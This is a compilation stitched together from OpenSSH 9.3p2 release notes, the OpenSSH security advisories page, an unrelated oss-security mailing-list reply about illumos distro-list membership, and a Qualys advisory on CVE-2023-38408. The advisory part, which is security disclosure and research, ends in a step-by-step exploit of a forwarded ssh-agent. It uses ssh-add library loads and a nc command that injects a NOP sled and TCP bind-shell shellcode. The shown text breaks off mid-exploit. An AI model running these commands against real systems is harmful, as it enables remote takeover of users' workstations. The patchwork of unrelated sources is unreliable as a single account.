OpenSSH 9.3p2 was released on 2023-07-19. It is available from the
mirrors listed at https://www.openssh.com/.
OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support.
Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
https://www.openssh.com/donations.html
Changes since OpenSSH 9.3
=========================
This release fixes a security bug.
Security
========
Fix CVE-2023-38408 - a condition where specific libaries loaded via
ssh-agent(1)'s PKCS#11 support could be abused to achieve remote
code execution via a forwarded agent socket if the following
conditions are met:
\* Exploitation requires the presence of specific libraries on
the victim system.
\* Remote exploitation requires that the agent was forwarded
to an attacker-controlled system.
Exploitation can also be prevented by starting ssh-agent(1) with an
empty PKCS#11/FIDO allowlist (ssh-agent -P '') or by configuring
an allowlist that contains only specific provider libraries.
This vulnerability was discovered and demonstrated to be exploitable
by the Qualys Security Advisory team.
In addition to removing the main precondition for exploitation,
this release removes the ability for remote ssh-agent(1) clients
to load PKCS#11 modules by default (see below).
Potentially-incompatible changes
--------------------------------
\* ssh-agent(8): the agent will now refuse requests to load PKCS#11
modules issued by remote clients by default. A flag has been added
to restore the previous behaviour "-Oallow-remote-pkcs11".
Note that ssh-agent(8) depends on the SSH client to identify
requests that are remote. The OpenSSH >=8.9 ssh(1) client does
this, but forwarding access to an agent socket using other tools
may circumvent this restriction.
Checksums:
==========
- SHA1 (openssh-9.3p2.tar.gz) = 219cf700c317f400bb20b001c0406056f7188ea4
- SHA256 (openssh-9.3p2.tar.gz) = IA6+FH9ss/EB/QzfngJEKvfdyimN/9n0VoeOfMrGdug=
Please note that the SHA256 signatures are base64 encoded and not
hexadecimal (which is the default for most checksum tools). The PGP
key used to sign the releases is available from the mirror sites:
https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE\_KEY.asc
Reporting Bugs:
===============
- Please read https://www.openssh.com/report.html
Security bugs should be reported directly to openssh@openssh.com

OpenSSH: Security

## [*Open***SSH**](/) Security

---

OpenSSH is developed with the same rigorous security process that the
OpenBSD group is famous for. If you wish to report a security issue in
OpenSSH, please contact the private developers list <openssh@openssh.com>.

For more information, see the
[OpenBSD security page](https://www.openbsd.org/security.html).

* **July 1, 2024**

  sshd(8) in Portable OpenSSH versions 8.5p1 to 9.7p1 (inclusive).

  Race condition resulting in potential remote code execution.

  A race condition in sshd(8) could allow remote code execution as
  root on non-OpenBSD systems. This attack could be prevented by
  disabling the login grace timeout (LoginGraceTime=0 in
  sshd\_config) though this makes denial-of service against
  sshd(8) considerably easier.

  For more information, please refer to the
  [release notes](txt/release-9.8) and the report from the
  [Qualys Security Advisory Team](https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt) who discovered the bug.* **July 1, 2024**

    ssh(1) in OpenSSH versions 9.5p1 to 9.7p1 (inclusive).

    Logic error in ObscureKeystrokeTiming option.

    A logic error in the implementation of the ssh(1) ObscureKeystrokeTiming
    option rendered the feature ineffective and additionally exposed limited
    keystroke timing information when terminal echo was disabled, e.g. while
    entering passwords to su(8) or sudo(8). This condition could be avoided
    for affected versions by disabling the feature using
    ObscureKeystrokeTiming=no.

    For more information, please refer to the
    [release notes](txt/release-9.8).* **December 18, 2023**

      ssh(1), sshd(8) in OpenSSH prior to version 9.6.

      Weakness in initial key exchange ("Terrapin Attack")

      A weakness in the initial SSH protocol key exchange allows an
      on-path attacker to delete a number of consecutive messages from
      the early encrypted protocol without detection. While cryptographically
      novel, there is no discernable impact on the integrity of SSH traffic
      beyond giving the attacker the ability to delete the message that
      enables some features related to keystroke timing obfuscation.

      This attack is prevented by a new protocol extension in OpenSSH 9.6.

      For more information, please refer to the
      [release notes](txt/release-9.6).* **December 18, 2023**

        ssh-agent(1) in OpenSSH between 8.9 and 9.5 (inclusive)

        Incomplete application of destination constraints to smartcard keys.

        Destination constraints added when loading PKCS#11 keys from a token
        were being applied to only the first key returned from the token.

        This bug is corrected in OpenSSH 9.6.

        For more information, please refer to the
        [release notes](txt/release-9.6).* **July 19, 2023**

          ssh-agent(1) in OpenSSH between and 5.5 and 9.3p1 (inclusive)
          remote code execution relating to PKCS#11 providers

          The PKCS#11 support ssh-agent(1) could be abused to achieve remote
          code execution via a forwarded agent socket if the following conditions
          are met:
          + Exploitation requires the presence of specific libraries on the victim system.
          + Remote exploitation requires that the agent was forwarded to an attacker-controlled system.Exploitation can also be prevented by starting ssh-agent(1) with an
          empty PKCS#11/FIDO allowlist (ssh-agent -P '') or by configuring
          an allowlist that contains only specific provider libraries.

          This vulnerability was discovered and demonstrated to be exploitable
          by the Qualys Security Advisory team. This vulnerability has been
          assigned CVE-2023-38408.

          This bug is corrected in OpenSSH 9.3p2. For OpenBSD, an
          [errata](https://www.openbsd.org/errata.html)
          patch exists to fix this problem.

          For more information, please refer to the
          [release notes](txt/release-9.3p2).* **March 15, 2023**

            ssh-add(1) in OpenSSH between and 8.9 and 9.2 (inclusive).

            ssh-add(1) did not apply destination constraints to smartcard keys.

            When adding smartcard keys to ssh-agent(1) with the per-hop destination
            constraints (*ssh-add -h ...*), a logic error prevented the
            constraints from being communicated to the agent. This resulted in the
            keys being added without constraints. The common cases of
            non-smartcard keys and keys without destination constraints are
            unaffected.

            This bug is corrected in OpenSSH 9.3.

            For more information, please refer to the
            [release notes](txt/release-9.3).* **February 2, 2023**

              ssh(1) in OpenSSH between and 8.7 and 9.1 (inclusive).

              ssh(1) failed to correctly process PermitRemoteOpen options.

              The PermitRemoteOpen option
              would ignore its first argument unless it was one of the special
              keywords "any" or "none", causing the permission list to fail open
              if only one permission was specified.

              This bug is corrected in OpenSSH 9.2.

              For more information, please refer to the
              [release notes](txt/release-9.2).* **February 2, 2023**

                ssh(1) in OpenSSH between and 6.5 and 9.1 (inclusive).

                ssh(1) failed to check DNS names returned from libc for validity.

                If the CanonicalizeHostname and CanonicalizePermittedCNAMEs
                options were enabled, and the system/libc resolver did not check
                that names in DNS responses were valid, then use of these options
                could allow an attacker with control of DNS to include invalid
                characters (possibly including wildcards) in names added to
                known\_hosts files when they were updated. These names would still
                have to match the CanonicalizePermittedCNAMEs allow-list, so
                practical exploitation appears unlikely.

                This bug is corrected in OpenSSH 9.2.

                For more information, please refer to the
                [release notes](txt/release-9.2).* **February 2, 2023**

                  sshd in OpenSSH between and 9.1 (only).

                  Double-free memory fault in pre-authentication sshd process.

                  sshd(8) contained a network-reachable pre-authentication double-free
                  memory fault introduced in OpenSSH 9.1. This is not believed to be
                  exploitable, and it occurs in the unprivileged pre-auth process that is
                  subject to chroot(2) and is further sandboxed on most major
                  platforms.

                  This bug is corrected in OpenSSH 9.2.

                  For more information, please refer to the
                  [release notes](txt/release-9.2).* **September 26, 2021**

                    sshd in OpenSSH between 6.2 and 8.7 (inclusive).

                    sshd(8) failed to correctly initialise supplemental groups when
                    executing an `AuthorizedKeysCommand` or
                    `AuthorizedPrincipalsCommand`, where a
                    `AuthorizedKeysCommandUser` or
                    `AuthorizedPrincipalsCommandUser` directive was been set to
                    run the command as a non-root user. Instead these commands would inherit
                    the groups that sshd(8) was started with.

                    Depending on system configuration, inherited groups may allow
                    the helper programs to gain unintended privilege.

                    Neither `AuthorizedKeysCommand` nor
                    `AuthorizedPrincipalsCommand` are enabled by default in
                    sshd\_config(5).

                    This bug is corrected in OpenSSH 8.8

                    For more information, please refer to the
                    [release notes](txt/release-8.8).* **March 3, 2021**

                      ssh-agent in OpenSSH between 8.2 and 8.4 (inclusive).

                      Double-free memory corruption. Mitigated by socket peer user identity
                      checking and double-free protection in malloc(3).
                      This bug is corrected in OpenSSH 8.5
                      For more information, please refer to the
                      [release notes](txt/release-8.5).* **October 3, 2017**

                        All version of OpenSSH prior to 7.6 supporting read-only mode in sftp-server
                        (introduced in 5.5).
                        Incorrect open(2) flags in sftp-server permitted creation
                        of zero-length files when the server was running in read-only mode (invoked
                        using the -R command-line flag).

                        This bug is corrected in OpenSSH 7.6.
                        For more information, please refer to the
                        [release notes](txt/release-7.6).* **March 9, 2016**

                          All versions of OpenSSH prior to 7.2p2 with X11Forwarding
                          enabled.
                          Missing sanitisation of untrusted input allows an
                          authenticated user who is able to request X11 forwarding
                          to inject commands to xauth(1).

                          Mitigate by setting **X11Forwarding=no** in sshd\_config, or on the
                          commandline. This is the default, but some vendors enable the feature.

                          For more information see [the advisory](txt/x11fwd.adv).

                          This bug is corrected in OpenSSH 7.2p2 and in OpenBSD's stable branch.
                          For more information, please
                          refer to the [release notes](txt/release-7.2p2).* **January 14, 2016**

                            OpenSSH clients between versions 5.4 and 7.1 are vulnerable to
                            information disclosure that may allow a malicious server to retrieve
                            information including under some circumstances, user's private keys.
                            This may be mitigated by adding the undocumented config option
                            **UseRoaming no** to ssh\_config.

                            For more information see [CVE-2016-0777](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0777) and [CVE-2016-0778](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0778).

                            This bug is corrected in OpenSSH 7.1p2 and in OpenBSD's stable branch.

                              OpenSSH 7.0 contained a logic error in PermitRootLogin=
                              prohibit-password/without-password that could, depending on
                              compile-time configuration, permit password authentication to
                              root while preventing other forms of authentication.

                              This bug is corrected in OpenSSH 7.1. For more information, please

This looks pretty good for OmniOS, e.g. for OpenSSL CVE-2023-3817 it
appears to be 4 days from OpenSSL advisory on "31st July 2023" to OmniOS
"r151046n (2023-08-03)", and even something like 1 day for OpenSSH
update to "9.3p2, fixing CVE-2023-38408" and for "AMD CPU microcode
updated to 20230719, mitigating CVE-2023-20593 on some Zen2 processors"
in "r151046m (2023-07-25)" (it was brought to oss-security on July 24).

That page above goes back to May 2023.  Were there separate ones for
older releases?  For "a publicly verifiable track record, dating back at
least 1 year and continuing to present day".

This sounds very different from how the existing distros list members
operate.  In fact, it may be inconsistent with our current policy for
list members, which says:

<https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-members>

"Aside from your participation in discussions with the reporter and on
the (linux-)distros lists (including possibly continuing to CC other
prior recipients of the information), the information you receive
through the (linux-)distros lists must not be made public, shared, nor
even hinted at anywhere beyond the need-to-know within your distro's
team except with the reporter's explicit approval, until the agreed upon
public disclosure date/time or substantially complete publication by
others.  Neither you nor others you inform may use the information for
anything other than getting the issue fixed for your distro's users and,
only in rare extreme cases, for deployment of maximally non-revealing
changes to maintain security of your distro's infrastructure most
essential to the distro users' security in face of the security issue
being dealt with.  The need-to-know condition is met only if the person
needs to participate in one of these two activities."

Note the words "within your distro's team".  However, now you say you'll
"warn distro-runners", and in your first message you wrote:

> Like Linux, we have downstream distros.  Unlike Linux, illumos is more
> than what Linux would call, "kernel".

So you'd be joining as upstream for multiple other distros, who you'd be
sharing the info with.  I'd say that per the current criteria and policy
for members, those individual distros would need to qualify and join (or
not) one by one.  I actually doubt all of them would meet our current
criteria, so your warning all of them would be a bypass.

Now, given good enough reasons, the criteria could be changed or an
exception could be made.  I think illumos is a great project, it's great
that you have a distro ecosystem, and several people I recognize have
spoken in favor (including off-list).  However, I am not convinced we
have a case here where we'd want to accept indirect sharing of info with
distros some of which might not qualify on their own.  If we were to do
that, then why would we be subjecting other distros (non-illumos)
applying on their own to these same criteria, or would we relax for all?

Please correct me if I misunderstood something, or/and suggest a way
forward (either fully consistent with the constraints above or with
specific changes you'd propose and the community would find reasonable).

Thanks,

Alexander

Summary
========================================================================
"ssh-agent is a program to hold private keys used for public key
authentication. Through use of environment variables the agent can
be located and automatically used for authentication when logging in
to other machines using ssh(1). ... Connections to ssh-agent may be
forwarded from further remote hosts using the -A option to ssh(1)
(but see the caveats documented therein), avoiding the need for
authentication data to be stored on other machines."
(https://man.openbsd.org/ssh-agent.1)
"Agent forwarding should be enabled with caution. Users with the
ability to bypass file permissions on the remote host ... can access
the local agent through the forwarded connection. ... A safer
alternative may be to use a jump host (see -J)."
(https://man.openbsd.org/ssh.1)
Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.
While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib\* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE\_PKCS11, which is the default).
(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)
Although this seems safe at first (because every shared library in
/usr/lib\* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.
Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib\*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):
- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
looked into any other versions, distributions, or operating systems;
- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
and we ran it intermittently on a single laptop, so we have not tried
all the combinations of shared libraries and side effects;
- we initially had only one attack vector in mind (i.e., one specific
combination of side effects from shared libraries), but we discovered
six more while analyzing the results of our fuzzer, and we are
convinced that more attack vectors exist.
In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
https://www.qualys.com/research/security-advisories/ (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).
========================================================================
Background
========================================================================
The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C\_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib\*).
Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.
Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib\*/\*,/usr/local/lib\*/\*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
https://bugs.chromium.org/p/project-zero/issues/detail?id=1009):
- if an attacker had access to the server where Alice's ssh-agent is
forwarded to, and had an unprivileged access to Alice's workstation,
then this attacker could store a malicious shared library in /tmp on
Alice's workstation and execute it with Alice's privileges (via her
forwarded ssh-agent) -- a mild form of Local Privilege Escalation;
- if the attacker had only access to the server where Alice's ssh-agent
is forwarded to, but could somehow store a malicious shared library
somewhere on Alice's workstation (without access to her workstation),
then this attacker could remotely execute this shared library (via
Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.
Our first reaction was of course to try to bypass ssh-agent's /usr/lib\*
allow-list:
- by finding a logic bug in the filter function, match\_pattern\_list()
(but we failed);
- by making a path-traversal attack, for example /usr/lib/../../tmp (but
we failed, because ssh-agent first calls realpath() to canonicalize
the path of a shared library, and then calls the filter function);
- by finding a locally or remotely writable file or directory in
/usr/lib\* (but we failed).
Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib\*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
https://seclists.org/fulldisclosure/2010/Oct/344):
- an unprivileged local attacker could dlopen() any shared library from
/lib and /usr/lib (via the LD\_AUDIT environment variable), even when
executing a SUID-root program;
- the constructor functions of various common shared libraries created
files and directories whose location depended on the attacker's
environment variables and whose creation mode depended on the
attacker's umask;
- the local attacker could therefore create world-writable files and
directories anywhere in the filesystem, and obtain full root
privileges (via crond, for example).
Although the ability to load and unload shared libraries from /usr/lib\*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).
In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib\* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:
------------------------------------------------------------------------
1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU\_STACK ELF header,
or implicitly because of a missing GNU\_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().
For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.
------------------------------------------------------------------------
2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.
For example, /usr/lib/x86\_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.
------------------------------------------------------------------------
3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).
For example, /usr/lib/x86\_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.
------------------------------------------------------------------------
4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.
For example, most of the /usr/lib/x86\_64-linux-gnu/xtables/lib\*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.
------------------------------------------------------------------------
And so an exciting idea to remotely exploit ssh-agent came into our
mind:
a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;
b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);
c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");
d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);
e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.
========================================================================
Experiments
========================================================================
But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:
------------------------------------------------------------------------
Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib\* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.
Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib\* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.
------------------------------------------------------------------------
Step 2 - For each shared library in /usr/lib\*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.
------------------------------------------------------------------------
Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:
- 58 shared libraries make the stack executable when dlopen()ed (and the
stack remains executable even after dlclose());
- 16577 shared libraries permanently alter the mmap layout when
dlopen()ed (either because they are "nodelete" libraries, or because
they allocate a thread stack or otherwise leak mmap()ed memory);
- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
not deregister it when dlclose()d), and 238 shared libraries raise a
SIGSEGV when dlopen()ed;
- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
shared libraries raise a SIGABRT when dlopen()ed.
On Ubuntu Desktop 21.10:
- 30 shared libraries make the stack executable;
- 16172 shared libraries permanently alter the mmap layout;
- 9 shared libraries register a SIGSEGV handler, and 147 shared
libraries raise a SIGSEGV;
- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
raise a SIGABRT;
- 1 shared library registers a SIGBUS handler, and 11 shared libraries
raise a SIGBUS;
- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
raise a SIGCHLD;
- 1 shared library registers a SIGILL handler, and 1 shared library
raises a SIGILL.
------------------------------------------------------------------------
Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:
a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;
b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);
c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);
d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV\_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.
Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.
------------------------------------------------------------------------
Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:
a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;
b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;
c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.
Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).
------------------------------------------------------------------------
Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:
a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);
b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.
========================================================================
Results
========================================================================
In this section, we present the results of our experiments:
- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- \_Unwind\_Context type-confusion
- RCE in library constructor
========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================
This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.
------------------------------------------------------------------------
1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso),
without connecting this workstation to the Internet.
------------------------------------------------------------------------
1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:
workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list
------------------------------------------------------------------------
1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:
workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5
------------------------------------------------------------------------
2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:
workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)
workstation$ eval `ssh-agent -s`
Agent pid 1105
workstation$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-XXXXXXmgHTo9/agent.1104
workstation$ ssh -A server
server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
server$ echo /tmp/ssh-\*/agent.\*
/tmp/ssh-N5EjHljGRh/agent.1299
------------------------------------------------------------------------
3/ Then, as a remote attacker who has access to this server:
------------------------------------------------------------------------
3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):
server# echo /tmp/ssh-\*/agent.\*
/tmp/ssh-N5EjHljGRh/agent.1299
server# export SSH\_AUTH\_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299
server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation
------------------------------------------------------------------------
3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:
server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH\_AUTH\_SOCK"
[Press Ctrl-C after a few seconds.]
- we do not use ssh-add here, because we want to send a ~10KB passphrase
(our shellcode) to ssh-agent, but ssh-add limits the length of our
passphrase to 1KB;
- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
instruction);
- SHELLCODE is a "TCP bind shell" on port 31337 (from
https://shell-storm.org/shellcode/files/shellcode-858.html);
- /usr/lib/modules is an existing directory whose path matches
ssh-agent's /usr/lib\* allow-list (indeed, we do not want to actually
load a shared library here -- we just want to store our shellcode in
the executable stack);
------------------------------------------------------------------------
3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:
server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation
------------------------------------------------------------------------
3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:
server# ssh-add -s /usr/lib/x86\_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86\_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation
------------------------------------------------------------------------
3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:
